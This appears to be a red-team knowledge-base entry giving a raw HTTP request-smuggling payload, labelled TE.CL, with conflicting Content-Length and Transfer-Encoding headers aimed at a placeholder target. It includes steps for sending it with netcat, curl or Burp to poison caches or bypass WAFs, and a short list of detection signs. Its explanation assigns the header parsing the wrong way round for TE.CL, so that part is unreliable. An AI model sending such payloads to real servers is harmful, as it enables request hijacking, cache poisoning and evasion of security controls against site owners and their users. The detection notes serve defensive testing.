---
type: code
language: http
verified: true
tags:
  - request-smuggling
  - te-cl
  - payload
platforms:
  - Web
validated: true
---

# basic-te-cl-smuggling-http-payload

## Code

```http
POST / HTTP/1.1
Host: $TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

## Description

This HTTP payload demonstrates a basic TE.CL Request Smuggling attack. It includes conflicting Content-Length (3 bytes) and Transfer-Encoding: chunked headers. The front-end server reads only 3 bytes after headers, but the back-end processes the full chunked body (hex '8' for 8 bytes of 'SMUGGLED', followed by empty chunk '0'), allowing the remaining data to poison the next request.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET | Target hostname | vulnerable-website.com |

## Usage

Send this raw HTTP via netcat, curl (with --http1.1 and custom headers), or Burp Suite Repeater. Follow with a legitimate request to observe smuggling effects, such as injected text in responses. Useful for testing cache poisoning or bypassing WAF rules in red team engagements.

## Detection

- WAF logs showing requests with both Content-Length and Transfer-Encoding headers.
- Anomalous chunked bodies or mismatched body lengths in proxy logs.
- Backend server errors from desynchronized request parsing.
- Network traffic analysis for repeated smuggling patterns.

## Related

- [[procedures/TE-CL-Request-Smuggling]]
- [[commands/nc-send-basic-te-cl-smuggling-request]]
